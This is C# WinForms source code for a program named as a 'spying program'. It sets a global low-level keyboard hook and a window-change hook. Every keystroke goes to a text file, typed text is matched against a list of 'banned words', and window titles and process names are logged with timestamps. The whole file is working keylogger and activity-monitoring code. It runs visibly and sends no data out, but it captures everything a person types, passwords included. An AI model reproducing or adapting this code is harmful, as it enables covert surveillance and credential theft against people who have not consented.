using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace project_WinForm_spying_program
{
    public partial class Form1 : Form
    {
        private static bool programRunning = false;
        private static string saveFolder;
        private static string bannedSaveFolder;
        private static string titleSaveFolder;
        private static string processSaveFolder;
        private static List<char> charactersPressed = new List<char> { };
        private static List<string> bannedWords = new List<string>();
        private static int seconds = 0;
        private static int keys = 0;
        private static int banned = 0;
        private static string textSavedInFile;
        System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
        private static IntPtr windowHook = IntPtr.Zero;
        private static IntPtr keyHook = IntPtr.Zero;
        private static HookProc hookProc;
        public Form1()
        {
            InitializeComponent();
            timer.Interval = 1000;
            timer.Tick += Timer_Tick;
            hookProc = HookCallback;
        }

        private void startButton_Click(object sender, EventArgs e)
        {
            if (!programRunning)
            {
                programRunning = true;
                bool checkKeys = keyCheckBox.Checked;
                if (checkKeys)
                {
                    saveFolder = folderBox.Text;
                    keyFolderLabel.Text = $"Key data saved in: {saveFolder}";
                    bool checkBannedWords = bannedCheckBox.Checked;
                    if (checkBannedWords)
                    {
                        foreach (string bannedWord in bannedListBox.Text.Split('/'))
                        {
                            if (!string.IsNullOrEmpty(bannedWord))
                            {
                                if (ignoreCaseCheckBox.Checked)
                                {
                                    bannedWords.Add(bannedWord.ToLower());
                                }
                                else
                                {
                                    bannedWords.Add(bannedWord);
                                }
                            }
                        }
                        bannedSaveFolder = bannedFolderBox.Text;
                        bannedFolderLabel.Text = $"Banned words data saved in: {bannedSaveFolder}";
                    }
                    keyHook = SetHook(hookProc);
                    testLabel.Text = "hook started";
                }
                bool checkPrograms = programsCheckBox.Checked;
                if (checkPrograms)
                {
                    titleSaveFolder = titleFolderBox.Text;
                    processSaveFolder = processFolderBox.Text;
                    windowHook = SetWinEventHook(
                        3,
                        3,
                        IntPtr.Zero,
                        WinEventProc,
                        0,
                        0,
                        0);
                }
                timer.Start();
            }
            else
            {
                MessageBox.Show("Stop the program before running again", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void Timer_Tick(object? sender, EventArgs e)
        {
            seconds++;
            monitoringTimeLabel.Text = $"Monitoring went on for: {seconds}";
        }

        private void saveKeyPressed(char character)
        {
            if (!string.IsNullOrEmpty(saveFolder))
            {
                Directory.CreateDirectory(saveFolder);
            }
            File.AppendAllText(saveFolder + "keyPressed.txt", character + ", ");
        }

        private void saveBannedWord(string word)
        {
            if (!string.IsNullOrEmpty(bannedSaveFolder))
            {
                Directory.CreateDirectory(bannedSaveFolder);
            }
            File.AppendAllText(bannedSaveFolder + "bannedWord.txt", word + ", ");
        }

        private static void saveOpenedProgram(string title, string processName)
        {
            if (!string.IsNullOrEmpty(titleSaveFolder))
            {
                Directory.CreateDirectory(titleSaveFolder);
            }
            if (!string.IsNullOrEmpty(processSaveFolder))
            {
                Directory.CreateDirectory(processSaveFolder);
            }
            File.AppendAllText(titleSaveFolder + "programTitle.txt", title + ", Time: " + DateTime.Now.ToString() + '\n');
            File.AppendAllText(processSaveFolder + "processOpened.txt", processName + ", Time: " + DateTime.Now.ToString() + '\n');
        }

        private void checkBannedWords()
        {
            bool found;
            foreach (string word in bannedWords)
            {
                if (word.Length > charactersPressed.Count)
                {
                    continue;
                }
                found = true;
                for (int i = 0; i < word.Length; i++)
                {
                    if (ignoreCaseCheckBox.Checked)
                    {
                        if (charactersPressed[charactersPressed.Count - word.Length + i].ToString().ToLower() != word[i].ToString())
                        {
                            found = false;
                            break;
                        }
                    }
                    else if (charactersPressed[charactersPressed.Count - word.Length + i] != word[i])
                    {
                        found = false;
                        break;
                    }
                }
                if (found)
                {
                    Task.Run(() =>
                    {
                        saveBannedWord(word);
                    });
                    updateBannedWords();
                    testLabel2.Text = word;
                }
            }
        }

        private void updateBannedWords()
        {
            banned++;
            bannedWordsLabel.Text = $"Banned words saved: {banned}";
        }

        private void stopButton_Click(object sender, EventArgs e)
        {
            timer.Stop();
            bannedWords.Clear();
            charactersPressed.Clear();
            UnhookWindowsHookEx(keyHook);
            UnhookWinEvent(windowHook);
            MessageBox.Show("The monitoring phase has been stopped");
            programRunning = false;
        }

        private void showKeysPressedButton_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(saveFolder) || string.IsNullOrEmpty(saveFolder))
            {
                textSavedInFile = File.ReadAllText(saveFolder + "keyPressed.txt");
                Form2 textWindow = new Form2();
                textWindow.infoLabel.Text = textSavedInFile;
                textWindow.Show();
            }
            else
            {
                MessageBox.Show("File for saving written keys was not created yet, it will be created upon writing a key", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void showBannedWordsButton_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(bannedSaveFolder) || string.IsNullOrEmpty(bannedSaveFolder))
            {
                textSavedInFile = File.ReadAllText(bannedSaveFolder + "bannedWord.txt");
                Form2 textWindow = new Form2();
                textWindow.infoLabel.Text = textSavedInFile;
                textWindow.Show();
            }
            else
            {
                MessageBox.Show("File for saving banned words was not created yet, it will be created upon writing a banned word", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void showTitlesOpenedButton_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(titleSaveFolder) || string.IsNullOrEmpty(titleSaveFolder))
            {
                textSavedInFile = File.ReadAllText(titleSaveFolder + "programTitle.txt");
                Form2 textWindow = new Form2();
                textWindow.infoLabel.Text = textSavedInFile;
                textWindow.Show();
            }
            else
            {
                MessageBox.Show("File for saving opened window's titles was not created yet, it will be created upon opening a window", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void showProcessesNamesButton_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(processSaveFolder) || string.IsNullOrEmpty(processSaveFolder))
            {
                textSavedInFile = File.ReadAllText(processSaveFolder + "processOpened.txt");
                Form2 textWindow = new Form2();
                textWindow.infoLabel.Text = textSavedInFile;
                textWindow.Show();
            }
            else
            {
                MessageBox.Show("File for saving opened window's process names was not created yet, it will be created upon opening a window", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private static IntPtr SetHook(HookProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) // gets the executable file
            {
                return SetWindowsHookEx(
                    13,
                    proc,
                    GetModuleHandle(curModule.ModuleName), // yo this exec has a handle to my hook - get it and use it
                    0);
            }
        }

        //btw I can explain this code that you are about to see next
        private static char? GetCharFromKey(int vkCode)
        {
            byte[] keyboardState = new byte[256];
            IntPtr foregroundWindow = GetForegroundWindow();
            uint foregroundThread = GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero);
            uint currentThread = GetCurrentThreadId();

            AttachThreadInput(currentThread, foregroundThread, true);
            GetKeyboardState(keyboardState);
            AttachThreadInput(currentThread, foregroundThread, false);

            uint scanCode = MapVirtualKey((uint)vkCode, 0);

            StringBuilder sb = new StringBuilder(5);
            IntPtr layout = GetKeyboardLayout(foregroundThread);

            int result = ToUnicodeEx(
                (uint)vkCode,
                scanCode,
                keyboardState,
                sb,
                sb.Capacity,
                0,
                layout);

            if (result > 0)
                return sb[0];

            return null;
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        delegate void WinEventDelegate(
            IntPtr hWinEventHook,
            uint eventType,
            IntPtr hwnd,
            int idObject,
            int idChild,
            uint dwEventThread,
            uint dwmsEventTime);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam != (IntPtr)0x0101 && wParam != (IntPtr)0x0105) // if the user releases key/releases system key - ignore
            {
                int vkCode = Marshal.ReadInt32(lParam);
                char? character = GetCharFromKey(vkCode);

                if ((Keys)vkCode == Keys.Back)
                {
                    lock (charactersPressed)
                    {
                        if (charactersPressed.Count > 0)
                        {
                            charactersPressed.RemoveAt(charactersPressed.Count - 1);
                        }
                    }
                    Task.Run(() => { File.AppendAllText(saveFolder + "keyPressed.txt", "Back, "); });
                    keys++;
                    Form1 form = Application.OpenForms[0] as Form1;
                    form.BeginInvoke(() => { form.keysPressedLabel.Text = $"Keys saved: {keys}"; });
                    return CallNextHookEx(keyHook, nCode, wParam, lParam);
                }

                if (character != null)
                {
                    char c = character.Value;
                    Form1 form = Application.OpenForms[0] as Form1;
                    keys++;
                    form.BeginInvoke(() =>
                    {
                        form.keysPressedLabel.Text = $"Keys saved: {keys}";
                        form.testLabel.Text = c.ToString();
                    });
                    lock (charactersPressed)
                    {
                        charactersPressed.Add(c);
                        form.checkBannedWords();
                    }

                    Task.Run(() =>
                    {
                        form.saveKeyPressed(c);
                    });
                }
            }

            return CallNextHookEx(keyHook, nCode, wParam, lParam);
        }

        static void WinEventProc(
            IntPtr hWinEventHook,
            uint eventType,
            IntPtr hwnd,
            int idObject,
            int idChild,
            uint dwEventThread,
            uint dwmsEventTime)
        {
            StringBuilder title = new StringBuilder(256);
            GetWindowText(hwnd, title, title.Capacity);

            uint pid;
            GetWindowThreadProcessId(hwnd, out pid);
            Process process = Process.GetProcessById((int)pid);
            string processName = process.ProcessName;

            Task.Run(() => saveOpenedProgram(title.ToString(), processName));
            Form1 form = Application.OpenForms[0] as Form1;
            form.BeginInvoke((Action)(() =>
            {
                form.testLabel4.Text = processName;
            }));
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnhookWindowsHookEx(keyHook);
            UnhookWinEvent(windowHook);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(
            int idHook,
            HookProc lpfn,
            IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(
            IntPtr hhk,
            int nCode,
            IntPtr wParam,
            IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(
            IntPtr hWnd,
            IntPtr processId);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll")]
        private static extern bool AttachThreadInput(
            uint idAttach,
            uint idAttachTo,
            bool fAttach);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(
            uint wVirtKey,
            uint wScanCode,
            byte[] lpKeyState,
            StringBuilder pwszBuff,
            int cchBuff,
            uint wFlags,
            IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(
            uint uCode,
            uint uMapType);

        [DllImport("user32.dll")]
        static extern IntPtr SetWinEventHook(
            uint eventMin,
            uint eventMax,
            IntPtr hmodWinEventProc,
            WinEventDelegate lpfnWinEventProc,
            uint idProcess,
            uint idThread,
            uint dwFlags);

        [DllImport("user32.dll")]
        static extern bool UnhookWinEvent(IntPtr hWinEventHook);

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
    }
}
